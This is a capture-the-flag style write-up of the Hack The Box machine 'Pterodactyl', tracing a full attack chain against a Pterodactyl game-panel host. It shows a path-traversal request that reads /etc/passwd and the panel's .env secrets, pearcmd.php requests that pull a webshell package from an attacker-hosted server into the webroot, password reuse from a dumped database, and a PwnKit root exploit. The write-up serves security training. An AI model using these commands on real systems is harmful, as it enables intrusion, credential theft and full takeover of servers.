---
title: "Pterodactyl"
difficulty: Medium
os: linux
points: 30
rating: 3
date: 2026-02-07
avatar: assets/htb/pterodactyl.png
tags: [Local File Inclusion, Remote Code Execution, Information Disclosure, Misconfiguration, Code Injection, Hard-coded Credentials, Reconnaissance, Password Reuse]
htb_url: https://app.hackthebox.com/machines/Pterodactyl
---
## Summary

Pterodactyl is a medium Linux box built around the Pterodactyl game-server management panel running on openSUSE. I abused a directory traversal in the panel (CVE-2025-49132) to read arbitrary files and recover panel secrets, then leveraged the classic PEAR `pearcmd.php` LFI-to-RCE technique — `register_argc_argv` being enabled in php.ini let me inject CLI arguments through the query string and drop a webshell. From there I recovered database credentials, pivoted to a real OS user through password reuse, and escalated to root through the openSUSE PAM/Polkit stack.

## Enumeration

A full port scan turns up SSH and an HTTPS service fronting the Pterodactyl Panel.

```bash
nmap -p- --min-rate=10000 -sV -sC pterodactyl.htb
# 22  ssh
# 443 https -> Pterodactyl Panel
```

The panel version can be fingerprinted from `/api/application` or page metadata, which is what tells me CVE-2025-49132 is in scope.

## Foothold

### CVE-2025-49132 - Panel Path Traversal

The file-management endpoint is vulnerable to path traversal, so I can read arbitrary files off the box with a valid bearer token:

```bash
curl -sk "https://pterodactyl.htb/api/client/servers/<server-id>/files/contents?file=../../../../../../etc/passwd" \
  -H "Authorization: Bearer <jwt>"
```

I use the same traversal to read the panel `.env` and recover the **APP_KEY**, **DB creds**, and **mail SMTP** credentials.

### PEAR pearcmd.php LFI-to-RCE

`register_argc_argv = On` in php.ini means PHP populates `$argv` from the query string. When `pearcmd.php` is reachable via LFI, the parameters I pass become CLI arguments. I host a malicious `.tgz` containing a PHP webshell and trigger an install that writes it into the webroot:

```bash
# Upload a malicious .tgz via attacker HTTP server containing a PHP webshell
python3 -m http.server 80

# Trigger LFI -> pearcmd.php with install command
curl -sk "https://pterodactyl.htb/?+config-create+/&file=/usr/share/pear/pearcmd.php&+install+-R+/var/www/html+http://10.10.14.5/pwn.tgz"

# Or argv-injection variant:
curl -sk "https://pterodactyl.htb/index.php?+install+-R+/var/www/html+http://10.10.14.5/pwn.tgz&file=/usr/share/pear/pearcmd.php"
```

`pearcmd.php install --installroot=/path/to/webroot package.tgz` writes the attacker-controlled `package.tgz` content into the webroot. Browsing to the written webshell gives RCE as the `nginx`/`pterodactyl` user.

### User Pivot

With the Pterodactyl DB credentials recovered earlier, I dump MySQL for the password hashes of admin users. The cracked or reused passwords let me pivot to a real OS user over SSH.

## Privilege Escalation

openSUSE breaks a lot of Debian/Ubuntu assumptions, so I enumerate its PAM and Polkit specifics first:

```bash
ls -la /etc/pam.d/
cat /etc/pam.d/common-auth-pc
# Look for misconfigured "auth sufficient pam_listfile.so" or world-writable conf
pkexec --version
# 0.120 -> PwnKit CVE-2021-4034 if unpatched
```

If pkexec is unpatched, PwnKit (CVE-2021-4034) lands root directly:

```bash
git clone https://github.com/berdav/CVE-2021-4034 && cd CVE-2021-4034
make && ./cve-2021-4034
# euid=0
```

If PwnKit is patched, I look instead for **polkit rules** (`/etc/polkit-1/rules.d/`) granting the wheel group `org.freedesktop.systemd1.manage-units` or similar, then start a malicious systemd user-service to get code execution as root.
